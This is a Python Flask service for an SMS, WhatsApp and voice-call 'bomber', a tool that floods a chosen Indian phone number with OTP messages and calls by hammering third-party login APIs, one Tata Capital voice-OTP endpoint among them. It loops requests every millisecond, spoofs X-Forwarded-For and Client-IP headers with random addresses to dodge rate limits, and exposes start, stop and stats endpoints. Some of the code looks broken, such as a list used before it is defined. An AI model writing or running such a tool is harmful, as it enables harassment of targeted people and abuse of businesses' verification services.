from flask import Flask, request, jsonify
import asyncio
import aiohttp
import time
import random
import threading
import json

app = Flask(__name__)

# Your bomber class remains exactly the same
class UltimatePhoneDestroyer:
    def __init__(self):
        self.running = True
        self.stats = {
            "total_requests": 0,
            "successful_hits": 0,
            "failed_attempts": 0,
            "calls_sent": 0,
            "whatsapp_sent": 0,
            "sms_sent": 0,
            "start_time": time.time(),
            "active_apis": len(ULTIMATE_APIS)
        }
    
    async def bomb_phone(self, session, api, phone):
        # Your existing bomb_phone method here
        while self.running:
            try:
                name = api["name"]
                url = api["url"](phone) if callable(api["url"]) else api["url"]
                headers = api["headers"].copy()
                
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                headers["Client-IP"] = headers["X-Forwarded-For"]
                headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
                
                self.stats["total_requests"] += 1
                
                if "call" in name.lower() or "voice" in name.lower():
                    attack_type = "CALL"
                    self.stats["calls_sent"] += 1
                    emoji = "📞"
                elif "whatsapp" in name.lower():
                    attack_type = "WHATSAPP"
                    self.stats["whatsapp_sent"] += 1
                    emoji = "📱"
                else:
                    attack_type = "SMS"
                    self.stats["sms_sent"] += 1
                    emoji = "💬"
                
                if api["method"] == "POST":
                    data = api["data"](phone) if api["data"] else None
                    async with session.post(url, headers=headers, data=data, timeout=3, ssl=False) as response:
                        if response.status in [200, 201, 202]:
                            self.stats["successful_hits"] += 1
                        else:
                            self.stats["failed_attempts"] += 1
                else:
                    async with session.get(url, headers=headers, timeout=3, ssl=False) as response:
                        if response.status in [200, 201, 202]:
                            self.stats["successful_hits"] += 1
                        else:
                            self.stats["failed_attempts"] += 1
                
                await asyncio.sleep(0.001)
                
            except Exception as e:
                self.stats["failed_attempts"] += 1
                continue
    
    async def start_destruction(self, phone):
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for api in ULTIMATE_APIS:
                task = asyncio.create_task(self.bomb_phone(session, api, phone))
                tasks.append(task)
            
            await asyncio.gather(*tasks, return_exceptions=True)
    
    def stop(self):
        self.running = False

# Your ULTIMATE_APIS list goes here exactly as in your original file
ULTIMATE_APIS = [
    # ALL YOUR 900+ APIS EXACTLY AS IN YOUR ORIGINAL FILE
    # Copy the entire ULTIMATE_APIS list from your bomber.py here
    {
        "name": "Tata Capital Voice Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    # ... include ALL your APIs exactly as they are
]

# Store active destroyers
active_destroyers = {}

@app.route('/start_bomb', methods=['POST'])
def start_bomb():
    data = request.get_json()
    phone = data.get('phone')
    
    if not phone or not phone.isdigit() or len(phone) != 10:
        return jsonify({'error': 'Invalid phone number'}), 400
    
    # Stop existing destroyer for this phone if any
    if phone in active_destroyers:
        active_destroyers[phone].stop()
    
    # Start new destroyer
    destroyer = UltimatePhoneDestroyer()
    active_destroyers[phone] = destroyer
    
    # Run in background
    asyncio.create_task(destroyer.start_destruction(phone))
    
    return jsonify({
        'status': 'started', 
        'phone': phone,
        'message': f'Destruction started for +91{phone}'
    })

@app.route('/stop_bomb', methods=['POST'])
def stop_bomb():
    data = request.get_json()
    phone = data.get('phone')
    
    if phone in active_destroyers:
        active_destroyers[phone].stop()
        del active_destroyers[phone]
        return jsonify({'status': 'stopped', 'phone': phone})
    
    return jsonify({'error': 'No active destruction found'}), 404

@app.route('/stats/<phone>', methods=['GET'])
def get_stats(phone):
    if phone in active_destroyers:
        stats = active_destroyers[phone].stats
        return jsonify({
            'status': 'active',
            'stats': stats,
            'elapsed_time': time.time() - stats['start_time']
        })
    
    return jsonify({'status': 'inactive'})

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
